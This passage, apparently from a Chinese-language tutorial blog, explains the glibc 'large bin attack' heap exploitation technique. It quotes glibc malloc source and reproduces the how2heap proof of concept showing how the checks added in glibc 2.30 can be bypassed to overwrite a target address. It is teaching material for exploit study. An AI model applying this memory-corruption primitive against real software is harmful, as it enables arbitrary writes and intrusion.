+</span></span><span class="line"><span class="cl"><span class="n">p2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var2</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>
+</span></span></code></pre></div><p>我们改小p2的size，这样插入p3的时候，由于bk、bk_nextsize都指向变大的方向，因此p3会继承p2的bk、bk_nextsize并且将p2的fd和原先p2指向的下一个chunk（也就是p2-&gt;bk）的bk指向p3</p>
+<p>而这时，如果将p3插入large bin，那么由于bk指向更大的一个空闲的chunk，因此p2-&gt;bk会被更改为p3，同时，p2-&gt;bk原先的值的fd会指向p3，这也就是说：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">bck</span> <span class="o">=</span> <span class="n">p2</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">p3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">p3</span><span class="p">;</span>
+</span></span></code></pre></div><p>而由于我们将p2-&gt;bk改为了<code>&amp;stack_var1-2</code>，因此p2-&gt;bk-&gt;fd就是<code>stack_var1</code></p>
+<p>相关源码为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">mark_bin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span></code></pre></div><p>同理，bk_nextsize也可以用这个方法利用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">P3</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">P2</span><span class="p">;</span>  <span class="c1">//P3的fd_nextsize要修改成P2的头指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">P3</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">P2</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span> <span class="c1">//P3的bk_nextsize要修改成P2的bk_nextsize指向的地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">P2</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">P3</span><span class="p">;</span>  <span class="c1">//P2的bk_nextsize要修改成P3的头指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">P3</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">P3</span><span class="p">;</span> <span class="c1">//P3的bk_nextsize所指向的堆块的fd_nextsize要修改成P3的头指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">bck</span> <span class="o">=</span> <span class="n">P2</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span> <span class="c1">//bck等于P2的bk
+</span></span></span></code></pre></div><p>这里存在一个大小的判断，具体的解析见<a href="https://blog.csdn.net/qq_41202237/article/details/112825556">好好说话之Large Bin Attack_hollk的博客-CSDN博客</a></p>
+<h1 id="例子解释230以后">例子解释（2.30以后）</h1>
+<p>在2.30以后，glibc为large bin attack新增了两个检查，这里以<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.36/large_bin_attack.c">how2heap/large_bin_attack.c at master · shellphish/how2heap · GitHub</a>为例：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">A revisit to large bin attack for after glibc2.30
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">Relevant code snippet :
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)){
+</span></span></span><span class="line"><span class="cl"><span class="cm">		fwd = bck;
+</span></span></span><span class="line"><span class="cl"><span class="cm">		bck = bck-&gt;bk;
+</span></span></span><span class="line"><span class="cl"><span class="cm">		victim-&gt;fd_nextsize = fwd-&gt;fd;
+</span></span></span><span class="line"><span class="cl"><span class="cm">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
+</span></span></span><span class="line"><span class="cl"><span class="cm">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+</span></span></span><span class="line"><span class="cl"><span class="cm">	}
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/*Disable IO buffering to prevent stream from interfering with heap*/</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">_IONBF</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">_IONBF</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">_IONBF</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Since glibc2.30, two new checks have been enforced on large bin chunk insertion</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Check 1 : </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt;        malloc_printerr (</span><span class="se">\&#34;</span><span class="s">malloc(): largebin double linked list corrupted (nextsize)</span><span class="se">\&#34;</span><span class="s">);</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Check 2 : </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt;    if (bck-&gt;fd != fwd)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt;        malloc_printerr (</span><span class="se">\&#34;</span><span class="s">malloc(): largebin double linked list corrupted (bk)</span><span class="se">\&#34;</span><span class="s">);</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;This prevents the traditional large bin attack</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;However, there is still one possible path to trigger large bin attack. The PoC is shown below : </span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;====================================================================</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">target</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Here is the target we want to overwrite (%p) : %lu</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">target</span><span class="p">,</span><span class="n">target</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x428</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;First, we allocate a large chunk [p1] (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">p1</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="o">*</span><span class="n">g1</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;And another chunk to prevent consolidate</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x418</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;We also allocate a second large chunk [p2]  (%p).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">p2</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;This chunk should be smaller than [p1] and belong to the same large bin.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="o">*</span><span class="n">g2</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Once again, allocate a guard chunk to prevent consolidate</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Free the larger of the two --&gt; [p1] (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">p1</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="o">*</span><span class="n">g3</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x438</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Allocate a chunk larger than [p1] to insert [p1] into large bin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Free the smaller of the two --&gt; [p2] (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">p2</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;At this point, we have one chunk in large bin [p1] (%p),</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">p1</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;               and one chunk in unsorted bin [p2] (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">p2</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">p1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)((</span><span class="o">&amp;</span><span class="n">target</span><span class="p">)</span><span class="o">-</span><span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="o">&amp;</span><span class="n">target</span><span class="p">)</span><span class="o">-</span><span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="o">*</span><span class="n">g4</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x438</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">p2</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="n">p2</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;  the modified p1-&gt;bk_nextsize does not trigger any error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">p2</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="n">p1</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="n">p2</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">p2</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">target</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Target (%p) : %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">target</span><span class="p">,(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">target</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;====================================================================</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">assert</span><span class="p">((</span><span class="kt">size_t</span><span class="p">)(</span><span class="n">p2</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="n">target</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>因为传统的large bin attack依赖于对bk和bk_nextsize的修改，所以glibc在这两个上面加了检查：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// fwd = p2
+</span></span></span><span class="line"><span class="cl"><span class="c1">// bck = p2-&gt;bk
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): largebin double linked list corrupted (nextsize)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): largebin double linked list corrupted (bk)&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>这就要求传统的large bin attack中fwd-&gt;bk_nextsize指向的伪造的chunk的fd_nextsize的值是fwd（互相联通）；要求fwd-&gt;bk指向的伪造的chunk的fd的值是fwd。</p>
+<p>然而这个检查有个巨大的漏洞就是，当插入chunk的大小比这个bin中最小的chunk的大小都要小的时候，是不会执行这两个检查的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 如果请求大小比该 large bin 中最小的块还小，则跳过下面的循环
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">assert</span> <span class="p">(</span><span class="nf">chunk_main_arena</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="nf">chunksize_nomask</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">bck</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// 将 victim 插入到 fwd 的前面
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>因此，当我们将一个更小的chunk插入有一个chunk的large bin（两者的index一样）时，相当于反向地进行传统的large bin attack</p>
+<p>其中，<code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>就相当于<code>fwd-&gt;fd-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>相当于<code>p1-&gt;bk_nextsize-&gt;fd_nexsize = victim</code>，而<code>p1-&gt;bk_nextsize</code>被我们修改成了<code>(size_t)((&amp;target)-4)</code>，因此此时就会把target修改成victim，也就是p2的指针</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">p1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)((</span><span class="o">&amp;</span><span class="n">target</span><span class="p">)</span><span class="o">-</span><span class="mi">4</span><span class="p">);</span>
+</span></span></code></pre></div><h1 id="相关源码">相关源码</h1>
+<p>以下源码注释来自chatgpt</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">in_smallbin_range</span> <span class="p">(</span><span class="n">size</span><span class="p">))</span> <span class="c1">// 如果请求大小在 small bin 的范围内
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 找到 victim 所在的 small bin 的索引
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">victim_index</span> <span class="o">=</span> <span class="nf">smallbin_index</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// bck 指向 small bin 起始块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">bck</span> <span class="o">=</span> <span class="nf">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// fwd 指向下一个 small bin 的起始块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="c1">// 请求大小在 large bin 的范围内
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 找到 victim 所在的 large bin 的索引
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">victim_index</span> <span class="o">=</span> <span class="nf">largebin_index</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// bck 指向 large bin 起始块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">bck</span> <span class="o">=</span> <span class="nf">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// fwd 指向 large bin 起始块的下一个块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// 维护 large bin 的有序性
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">fwd</span> <span class="o">!=</span> <span class="n">bck</span><span class="p">)</span> <span class="c1">// 如果该 large bin 中有一个或更多空闲块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 将 size 和 PREV_INUSE 按位或以加速比较
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">size</span> <span class="o">|=</span> <span class="n">PREV_INUSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 如果请求大小比该 large bin 中最小的块还小，则跳过下面的循环
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">assert</span> <span class="p">(</span><span class="nf">chunk_main_arena</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="nf">chunksize_nomask</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">bck</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="c1">// 将 victim 插入到 fwd 的前面
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
